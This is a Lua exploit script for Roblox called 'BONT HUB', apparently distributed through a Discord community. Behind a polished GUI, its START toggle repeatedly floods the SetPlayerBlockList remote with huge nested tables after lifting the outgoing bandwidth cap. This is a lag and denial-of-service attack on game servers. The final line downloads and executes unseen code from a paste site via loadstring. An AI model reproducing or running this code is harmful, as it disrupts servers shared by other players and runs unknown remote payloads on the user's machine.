--discord.gg/cursorhub
--frnk33.
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local NetworkClient = game:GetService("NetworkClient")
local ReplicatedStorage = game:GetService("RobloxReplicatedStorage")

local localPlayer = Players.LocalPlayer

local state = {
    enabled = false,
    mode = "PC",
    keybindKb = Enum.KeyCode.V,
    keybindGp = Enum.KeyCode.ButtonB,
    power = 100000,
    minimized = false
}

local imageUrl = "https://kastor-box.lovable.app/api/public/f/4oguln5q.png"
local imageFileName = "bont_bg_4oguln5q.png"

pcall(function()
    if writefile and (game.HttpGet or HttpGet) then
        writefile(imageFileName, game:HttpGet(imageUrl))
    end
end)

local function getBgAsset()
    local ok, res = pcall(function()
        if getcustomasset and isfile and isfile(imageFileName) then
            return getcustomasset(imageFileName)
        end
        return imageUrl
    end)
    if ok and res then return res end
    return imageUrl
end

local function create(className, properties)
    local object = Instance.new(className)
    local parent = properties.Parent
    for property, value in pairs(properties) do
        if property ~= "Parent" then
            object[property] = value
        end
    end
    object.Parent = parent
    return object
end

local function addCorner(parent, radius)
    return create("UICorner", {
        CornerRadius = UDim.new(0, radius),
        Parent = parent,
    })
end

local function addStroke(parent, color, transparency)
    return create("UIStroke", {
        Color = color or Color3.fromRGB(60, 60, 60),
        Thickness = 1.5,
        Transparency = transparency or 0,
        Parent = parent,
    })
end

local c = {
    panel = Color3.fromRGB(40, 30, 50),
    purple = Color3.fromRGB(160, 80, 255),
    text = Color3.fromRGB(255, 255, 255),
    muted = Color3.fromRGB(150, 130, 180),
    dark = Color3.fromRGB(25, 20, 35)
}

local targetParent = pcall(function() return gethui() end) and gethui() or CoreGui
if targetParent:FindFirstChild("BontHubGUI") then
    targetParent.BontHubGUI:Destroy()
end

local screenGui = create("ScreenGui", {
    Name = "BontHubGUI",
    IgnoreGuiInset = true,
    ResetOnSpawn = false,
    Parent = targetParent
})

local main = create("Frame", {
    Name = "Main",
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.fromOffset(300, 350),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Active = true,
    Parent = screenGui,
})

local backgroundImage = create("ImageLabel", {
    Name = "BackgroundImage",
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    Image = getBgAsset(),
    ScaleType = Enum.ScaleType.Crop,
    ZIndex = 0,
    ClipsDescendants = true,
    Parent = main,
})
addCorner(backgroundImage, 14)

local topBar = create("Frame", {
    Name = "TopBar",
    Size = UDim2.new(1, 0, 0, 50),
    BackgroundTransparency = 1,
    Active = true,
    ZIndex = 2,
    Parent = main,
})

local title = create("TextLabel", {
    Size = UDim2.new(0, 150, 1, 0),
    Position = UDim2.fromOffset(20, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBlack,
    Text = "BONT HUB",
    TextColor3 = c.purple,
    TextSize = 16,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 3,
    Parent = topBar
})

local minBtn = create("TextButton", {
    Size = UDim2.fromOffset(30, 30),
    Position = UDim2.new(1, -20, 0.5, -15),
    AnchorPoint = Vector2.new(1, 0),
    BackgroundColor3 = c.dark,
    BackgroundTransparency = 0.1,
    Text = "-",
    TextColor3 = c.purple,
    Font = Enum.Font.GothamBlack,
    TextSize = 18,
    ZIndex = 3,
    Parent = topBar
})
addCorner(minBtn, 8)

local content = create("Frame", {
    Size = UDim2.new(1, -40, 1, -60),
    Position = UDim2.fromOffset(20, 50),
    BackgroundTransparency = 1,
    ZIndex = 2,
    Parent = main
})

local layout = create("UIListLayout", {
    Padding = UDim.new(0, 10),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = content
})

local powerPanel = create("Frame", {
    Size = UDim2.new(1, 0, 0, 80),
    BackgroundColor3 = c.panel,
    BackgroundTransparency = 0.05,
    Parent = content
})
addCorner(powerPanel, 10)

local powerBox = create("TextBox", {
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBlack,
    Text = "100K",
    TextColor3 = c.text,
    TextSize = 34,
    ClearTextOnFocus = false,
    ZIndex = 3,
    Parent = powerPanel
})

local modePanel = create("Frame", {
    Size = UDim2.new(1, 0, 0, 40),
    BackgroundColor3 = c.dark,
    BackgroundTransparency = 0.1,
    Parent = content
})
addCorner(modePanel, 10)

local pcBtn = create("TextButton", {
    Size = UDim2.new(0.5, 0, 1, 0),
    BackgroundColor3 = c.purple,
    BackgroundTransparency = 0,
    Text = "PC",
    TextColor3 = c.text,
    Font = Enum.Font.GothamBold,
    TextSize = 12,
    ZIndex = 3,
    Parent = modePanel
})
addCorner(pcBtn, 10)

local mobileBtn = create("TextButton", {
    Size = UDim2.new(0.5, 0, 1, 0),
    Position = UDim2.fromScale(0.5, 0),
    BackgroundColor3 = c.purple,
    BackgroundTransparency = 1,
    Text = "MOBILE",
    TextColor3 = c.text,
    Font = Enum.Font.GothamBold,
    TextSize = 12,
    ZIndex = 3,
    Parent = modePanel
})
addCorner(mobileBtn, 10)

local keysPanel = create("Frame", {
    Size = UDim2.new(1, 0, 0, 55),
    BackgroundTransparency = 1,
    Parent = content
})

local function createKeybindArea(titleTxt, defaultKey, xPos)
    local container = create("Frame", {
        Size = UDim2.new(0.48, 0, 1, 0),
        Position = UDim2.new(xPos, 0, 0, 0),
        BackgroundTransparency = 1,
        Parent = keysPanel
    })
    
    create("TextLabel", {
        Size = UDim2.new(1, 0, 0, 15),
        BackgroundTransparency = 1,
        Text = titleTxt,
        TextColor3 = c.muted,
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        Parent = container
    })

    local btn = create("TextButton", {
        Size = UDim2.new(1, 0, 0, 36),
        Position = UDim2.fromOffset(0, 19),
        BackgroundColor3 = c.dark,
        BackgroundTransparency = 0.1,
        Text = defaultKey,
        TextColor3 = c.purple,
        Font = Enum.Font.GothamBlack,
        TextSize = 14,
        Parent = container
    })
    addCorner(btn, 8)
    
    return btn
end

local keyBtn = createKeybindArea("KEY", state.keybindKb.Name, 0)
local padBtn = createKeybindArea("PAD", state.keybindGp.Name, 0.52)

local startBtn = create("TextButton", {
    Size = UDim2.new(1, 0, 0, 45),
    BackgroundColor3 = c.dark,
    BackgroundTransparency = 0.1,
    Text = "START",
    TextColor3 = c.purple,
    Font = Enum.Font.GothamBlack,
    TextSize = 14,
    Parent = content
})
addCorner(startBtn, 10)
addStroke(startBtn, c.purple, 0.3)

local function updateModes()
    if state.mode == "PC" then
        pcBtn.BackgroundTransparency = 0
        mobileBtn.BackgroundTransparency = 1
    else
        mobileBtn.BackgroundTransparency = 0
        pcBtn.BackgroundTransparency = 1
    end
end

pcBtn.MouseButton1Click:Connect(function()
    state.mode = "PC"
    updateModes()
end)

mobileBtn.MouseButton1Click:Connect(function()
    state.mode = "Mobile"
    updateModes()
end)

local _lagThread = nil

local function _bombLag(amt)
    local main, spam = {}, {{}}
    local z = spam[1]
    for _ = 1, 186 do 
        local t = {}
        table.insert(z, t)
        z = t 
    end
    local max = math.floor(amt / (186 + 2))
    for _ = 1, max do 
        table.insert(main, spam) 
    end
    pcall(function() 
        ReplicatedStorage.SetPlayerBlockList:FireServer(main) 
    end)
end

local function applyBypass()
    if state.enabled then
        if _lagThread then return end
        _lagThread = task.spawn(function()
            while state.enabled do
                pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
                _bombLag(state.power)
                task.wait(0.12)
            end
        end)
    else
        if _lagThread then 
            pcall(function() task.cancel(_lagThread) end)
            _lagThread = nil 
        end
        pcall(function() NetworkClient:SetOutgoingKBPSLimit(0) end)
    end
end

local function toggleState()
    state.enabled = not state.enabled
    if state.enabled then
        startBtn.Text = "STOP"
        startBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
        local stroke = startBtn:FindFirstChildOfClass("UIStroke")
        if stroke then stroke.Color = Color3.fromRGB(255, 100, 100) end
    else
        startBtn.Text = "START"
        startBtn.TextColor3 = c.purple
        local stroke = startBtn:FindFirstChildOfClass("UIStroke")
        if stroke then stroke.Color = c.purple end
    end
    applyBypass()
end

startBtn.MouseButton1Click:Connect(toggleState)

local function formatPower(num)
    if num >= 1000 then
        return string.format("%dK", math.floor(num / 1000))
    end
    return tostring(num)
end

powerBox.FocusLost:Connect(function()
    local rawText = powerBox.Text:upper():gsub("K", "000")
    local parsed = tonumber(rawText)
    if parsed then
        state.power = math.clamp(math.floor(parsed), 10000, 500000)
    end
    powerBox.Text = formatPower(state.power)
end)

local listeningFor = nil

local function updateKeyLabels()
    keyBtn.Text = listeningFor == "KB" and "..." or state.keybindKb.Name
    padBtn.Text = listeningFor == "GP" and "..." or state.keybindGp.Name
end

keyBtn.MouseButton1Click:Connect(function()
    listeningFor = "KB"
    updateKeyLabels()
end)

padBtn.MouseButton1Click:Connect(function()
    listeningFor = "GP"
    updateKeyLabels()
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe and not listeningFor then return end
    
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
    local isGp = input.UserInputType.Name:find("Gamepad")
    
    if listeningFor then
        if input.KeyCode ~= Enum.KeyCode.Unknown then
            if listeningFor == "KB" and isKb then
                state.keybindKb = input.KeyCode
            elseif listeningFor == "GP" and isGp then
                state.keybindGp = input.KeyCode
            end
            listeningFor = nil
            updateKeyLabels()
        end
        return
    end

    if (isKb and input.KeyCode == state.keybindKb) or (isGp and input.KeyCode == state.keybindGp) then
        toggleState()
    end
end)

minBtn.MouseButton1Click:Connect(function()
    state.minimized = not state.minimized
    if state.minimized then
        TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.fromOffset(300, 50)}):Play()
        content.Visible = false
    else
        TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.fromOffset(300, 350)}):Play()
        content.Visible = true
    end
end)

local dragging, dragInput, dragStart, startPos
topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

topBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

localPlayer.CharacterAdded:Connect(function()
    if state.enabled then
        if _lagThread then 
            pcall(function() task.cancel(_lagThread) end)
            _lagThread = nil 
        end
        task.defer(applyBypass) 
    end
end)

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()